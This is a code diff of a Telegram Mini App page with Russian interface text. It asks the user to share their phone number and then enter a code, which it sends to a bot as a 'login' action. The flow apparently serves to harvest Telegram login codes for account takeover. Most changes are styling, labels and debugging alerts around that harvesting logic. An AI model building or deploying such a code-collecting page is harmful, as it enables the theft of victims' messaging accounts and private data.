@@ -5,31 +5,39 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; padding: 20px; text-align: center; background: #fff; color: #000; }
+        body { font-family: sans-serif; padding: 20px; text-align: center; background: #ffffff; color: #000000; }
         .hidden { display: none !important; }
         button { 
-            background: #3390ec; color: white; border: none; padding: 20px; 
-            font-size: 20px; border-radius: 10px; width: 100%; margin-top: 20px; 
+            background: #3390ec; color: white; border: none; padding: 15px; 
+            font-size: 18px; border-radius: 10px; width: 100%; margin-top: 15px; 
             cursor: pointer; font-weight: bold;
         }
         input { 
-            width: 100%; padding: 20px; font-size: 30px; text-align: center; 
-            border: 2px solid #3390ec; border-radius: 10px; margin-top: 20px; box-sizing: border-box;
+            width: 100%; padding: 15px; font-size: 24px; text-align: center; 
+            border: 2px solid #3390ec; border-radius: 10px; margin-top: 15px; box-sizing: border-box;
         }
+        .test-btn { background: #ff3b30; margin-top: 30px; }
     </style>
 </head>
 <body>
 
+    <!-- Экран 1 -->
     <div id="screen-phone">
-        <h2>Шаг 1</h2>
+        <h2>Шаг 1: Номер</h2>
         <button id="share-phone-btn">ПОДЕЛИТЬСЯ НОМЕРОМ</button>
     </div>
 
+    <!-- Экран 2 -->
     <div id="screen-code" class="hidden">
-        <h2>Шаг 2</h2>
+        <h2>Шаг 2: Код</h2>
         <p>Номер: <b id="user-phone"></b></p>
-        <input type="number" id="code-input" placeholder="12345">
+        <input type="number" id="code-input" placeholder="Введите код">
+        
+        <!-- Основная кнопка -->
         <button id="submit-code-btn">ОТПРАВИТЬ КОД В БОТА</button>
+        
+        <!-- ТЕСТОВАЯ КНОПКА (Красная) -->
+        <button class="test-btn" onclick="alert('Кнопки работают! JS не заблокирован.');">ТЕСТ КНОПКИ</button>
     </div>
 
     <script>
@@ -38,6 +46,7 @@
                 const tg = window.Telegram.WebApp;
                 tg.expand();
 
+                // 1. Кнопка запроса номера
                 document.getElementById('share-phone-btn').onclick = function() {
                     tg.requestContact(function(shared, contact) {
                         if (shared) {
@@ -48,6 +57,7 @@
                     });
                 };
 
+                // 2. Кнопка отправки кода
                 document.getElementById('submit-code-btn').onclick = function() {
                     const code = document.getElementById('code-input').value;
                     
@@ -56,18 +66,18 @@
                         return;
                     }
 
-                    // ЖЕСТКИЙ ТЕСТ (окно должно появиться 100%)
-                    alert("Кнопка нажата! Отправляю: " + code);
-
-                    tg.sendData(JSON.stringify({
-                        action: "login",
-                        code: code
-                    }));
-                    
-                    tg.close();
+                    try {
+                        tg.sendData(JSON.stringify({
+                            action: "login",
+                            code: code
+                        }));
+                        // Если ошибок нет, показываем алерт и закрываем
+                        alert("Код отправлен боту!");
+                        tg.close();
+                    } catch (error) {
+                        alert("ОШИБКА ОТПРАВКИ: " + error.message);
+                    }
                 };
-            } else {
-                alert("Telegram не загрузился. Откройте через бота!");
             }
         };
     </script>
